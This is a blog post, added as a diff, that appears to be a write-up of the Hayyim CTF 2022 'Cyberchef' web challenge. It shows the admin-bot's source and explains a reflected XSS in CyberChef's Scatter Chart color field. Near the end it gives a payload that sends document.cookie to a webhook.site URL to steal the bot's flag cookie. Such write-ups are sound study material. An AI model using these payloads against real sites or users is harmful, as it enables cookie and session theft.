@@ -1,0 +1,144 @@
+---
+layout: post
+title:  "Hayyim CTF 2022 Cyberchef Writeup"
+tags: CTF
+---
+
+
+## Web - Cyberchef
+
+>The Cyber Swiss Army Knife.
+>
+>Flag Format: hsctf{…}
+
+[![Cyberchef](/assets/HCTF/cyber1.png)](/assets/HCTF/cyber1.png)
+<figcaption align=center><b>Figure 1: Cyberchef</b></figcaption>
+&nbsp;
+
+For this web challenge, we are greeted by a familiar face, Cyberchef.
+Alongside an instance for one of my favorite tools, we get a copy to
+some source code for an admin-bot.
+
+```javascript
+const webdriver = require('selenium-webdriver');
+const capabilities = webdriver.Capabilities.chrome();
+
+const flag = require('fs').readFileSync('/flag').toString().trim();
+
+const rateLimit = 30 * 1000;
+const pageTimeout = 3 * 1000;
+const urlPrefix = 'http://cyberchef:8000/';
+
+const timestamps = new Map();
+
+const sleep = (ms) => {
+  return new Promise((resolve) => {
+    setTimeout(() => resolve(), ms);
+  });
+};
+
+const checkRateLimit = (key) => {
+  const now = Date.now();
+
+  if (timestamps.has(key) && timestamps.get(key) > now - rateLimit) {
+    return false;
+  }
+
+  timestamps.set(key, now);
+  return true;
+};
+
+const checkUrl = (url) => {
+  return !(typeof url !== 'string' || !url.startsWith(urlPrefix) || url.length > 1024);
+};
+
+const visitUrl = (url) => {
+  return new Promise(async (resolve) => {
+    const driver = new webdriver.Builder('chrome')
+      .usingServer('http://selenium:4444/wd/hub/')
+      .withCapabilities(capabilities)
+      .build();
+
+    await driver.get(urlPrefix);
+
+    await driver.manage().addCookie({
+      name: 'flag',
+      value: flag
+    });
+
+    await driver.manage().setTimeouts({
+      implicit: pageTimeout,
+      pageLoad: pageTimeout,
+      script: pageTimeout
+    });
+
+    await driver.get(url);
+    await sleep(pageTimeout);
+    await driver.quit();
+
+    resolve();
+  });
+};
+
+module.exports = {
+  checkRateLimit,
+  checkUrl,
+  visitUrl
+};
+```
+
+The source code reveals the goal for this challenge. Much like
+other similar admin-bot-style challenges, we have to steal the admin's
+cookie. Supplying the admin-bot with a malicious link containing XSS
+is the most straight forward way to steal this cookie. However, the
+admin-bot has a single simple countermeasure
+
+```javascript
+const urlPrefix = 'http://cyberchef:8000/';
+
+...
+
+const checkUrl = (url) => {
+  return !(typeof url !== 'string' || !url.startsWith(urlPrefix) || url.length > 1024);
+};
+```
+
+The bot will only accept links originating from the Cyberchef instance
+URL. This means we can't send the bot just any malicious link to steal
+the cookie. Our payload has to make use of the Cyberchef instance
+somehow.
+
+[![Github Issue](/assets/HCTF/cyber2.png)](/assets/HCTF/cyber2.png)
+<figcaption align=center><b>Figure 2: Cyberchef GitHub Open XSS Issues</b></figcaption>
+&nbsp;
+
+After trying a few simple XSS ideas, I searched for Cyberchef specific
+XSS vulnerabilities. **Figure 2** shows the list of issues for
+Cyberchef version 9.3.4 on GitHub filtered down to XSS topics.
+The only relevant issue includes exactly what we are looking for, an
+XSS vulnerability in the "Scatter Chart" tool. You can find the full details [here](https://github.com/gchq/CyberChef/issues/1265)
+but as for the very basics of the vulnerability, we can use the color field of
+the scatter chart to smuggle an XSS payload.
+
+```
+red"><script>alert("XSS")</script>
+```
+
+When the payload above is inserted into the color field it will create a reflected
+XSS attack on whoever opens the link.
+
+[![Reflected](/assets/HCTF/cyber3.png)](/assets/HCTF/cyber3.png)
+<figcaption align=center><b>Figure 3: Cyberchef Reflected XSS Proof of Concept</b></figcaption>
+&nbsp;
+
+Next using a combination of https://webhook.site/ and the following payload, we
+can create a link to send the admin-bot and steal its cookie.
+
+```
+red"><script>document.write('<img src=x onerror=this.src="https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx?c="+document.cookie;>');</script>
+```
+
+Upon submitting the link to the admin-bot, webhook.site will graciously reveal
+the bot's cookie, which, is also the flag.
+
+>hsctf{fa98fe3d32b4302aff1c322c925238a9d935b636f265cbfdd798391ca9c5a905}
